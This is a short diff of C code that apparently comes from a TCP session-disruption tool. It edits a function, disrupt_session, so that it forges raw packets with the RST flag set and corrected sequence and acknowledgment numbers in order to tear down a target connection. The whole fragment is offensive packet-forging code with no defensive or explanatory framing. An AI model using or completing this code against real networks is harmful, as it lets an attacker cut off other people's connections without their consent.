@@ -105,7 +105,7 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     static bool checked = false;
     static uint32_t prevSeq = 0;
     static uint32_t prevAck = 0;
-    static char packet[65536];
+    static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
     
     // Socket FD
     int sock, one = 1;
@@ -152,13 +152,13 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
                 sourcePort,
                 destinationPort,
                 0,
-                1,
-                ackNumber + ack_inc,
+                0,
                 sequenceNumber + seq_inc,
-                1,
+                ackNumber + ack_inc,
+                RESET_ON,
                 "\0",
                 packet,
-                65536);
+                sizeof(struct tcphdr) + sizeof(struct iphdr) + 2);
 
     // Send out the packet
     send_packet(sock, packet, addr_in);
